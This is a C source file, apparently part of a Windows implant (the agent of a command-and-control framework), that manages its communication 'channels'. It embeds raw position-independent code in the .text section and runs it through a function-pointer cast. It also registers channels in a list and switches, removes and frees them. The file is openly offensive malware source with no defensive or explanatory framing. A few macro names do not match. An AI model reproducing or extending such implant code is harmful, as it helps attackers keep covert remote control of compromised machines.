#include "Channel.h"
#include "Implant.h"
#include "Config_simple.h"

LIST_ENTRY g_ChannelList;
PCHANNEL g_Channel;

#ifdef _MSC_VER
#define SECTION_VAR(sec_name) \
        __pragma(section(sec_name, read, write)) \
        __declspec(allocate(sec_name))
#define SECTION_FUNC(sec_name) __declspec(code_seg(sec_name))
#elif defined(__GNUC__) || defined(__clang__)
#define SECTION_VAR(sec_name)  __attribute__((section(sec_name)))
#define SECTION_FUNC(sec_name) __attribute__((section(sec_name)))
#else
#define SECTION_VAR(sec_name)
#define SECTION_FUNC(sec_name)
#endif

// Channel PIC
//
// __attribute__( ( section( ".text" ) ) )
#ifndef CHANNEL_CONFIG
#define CHANNEL_CONFIG {0x90, 0xC3}
#endif

SECTION_VAR(".text") BYTE g_DefaultChannel[] = CHANNEL_DEFAULT;
// BYTE                                         g_DefaultChannelConfig[] = DEFAULT_CHANNEL_CONFIG;

// ChannelInitialize initialize list then insert default channel
//
BOOL ChannelInitialize()
{
    PCHANNEL Channel = NULL;

    InitializeListHead(&g_ChannelList);

    if (!ChannelRegister(g_DefaultChannel, sizeof(g_DefaultChannel)))
    {
        printf("[-] Failed to register channel\n");
        return FALSE;
    }

    Channel = CONTAINING_RECORD(g_ChannelList.Flink, CHANNEL, ListEntry);
    if (!Channel->Interface->Initialize(Channel->Interface->Context))
    {
        printf("[-] Failed to switch to default implant channel\n");
        return FALSE;
    }

    g_Channel = Channel;
    return TRUE;
}

// ChannelRegister register new communication channel
//
DWORD ChannelRegister(PVOID BaseAddr, DWORD Size)
{
    PCHANNEL channel = NULL;
    BOOL (*ChannelEntrypoint)(IImplant*, IChannel*);

    channel = (PCHANNEL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CHANNEL));
    if (channel == NULL)
    {
        return 0;
    }

    channel->Interface = (IChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IChannel));
    if (channel->Interface == NULL)
    {
        return 0;
    }

    ChannelEntrypoint = (BOOL (*)(IImplant*, IChannel*))BaseAddr;
    if (!ChannelEntrypoint(&g_Implant.Interface, channel->Interface))
    {
        return FALSE;
    }

    channel->Memory.Base = BaseAddr;
    channel->Memory.Size = Size;

    InsertTailList(&g_ChannelList, &channel->ListEntry);

    return channel->Interface->ID;
}

// ChannelLoad load channel into target memory
//
BOOL ChannelLoad(PVOID Destination, PVOID Source, DWORD Size)
{
    memcpy(Destination, Source, Size);
    return TRUE;
}

// ChannelSwitch switch to a registered channel
//
BOOL ChannelSwitch(DWORD ID)
{
    LIST_ENTRY* current = g_ChannelList.Flink;

    while (current != &g_ChannelList)
    {
        PCHANNEL Channel = CONTAINING_RECORD(current, CHANNEL, ListEntry);

        if (Channel->Interface->ID == ID)
        {
            if (!Channel->Interface->Initialize(Channel->Interface->Context))
            {
                printf("[-] Failed to initialize implant channel: %lX\n", ID);
                return FALSE;
            }

            g_Channel = Channel;
            return TRUE;
        }

        current = current->Flink;
    }

    printf("[-] Channel not found\n");
    return FALSE;
}

// ChannelRemove remove channel
//
BOOL ChannelRemove(DWORD ID)
{
    LIST_ENTRY* current = g_ChannelList.Flink;

    while (current != &g_ChannelList)
    {
        PCHANNEL Channel = CONTAINING_RECORD(current, CHANNEL, ListEntry);

        if (Channel->Interface->ID == ID)
        {
            RemoveEntryList(&Channel->ListEntry);
            Channel->Interface->Cleanup(Channel->Interface->Context);
            ChannelFree(Channel);
            return TRUE;
        }

        current = current->Flink;
    }

    return FALSE;
}

// ChannelFree free channel
//
VOID ChannelFree(PCHANNEL Channel)
{
    VirtualFree(Channel->Memory.Base, Channel->Memory.Size, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, Channel->Interface);
    HeapFree(GetProcessHeap(), 0, Channel);
}
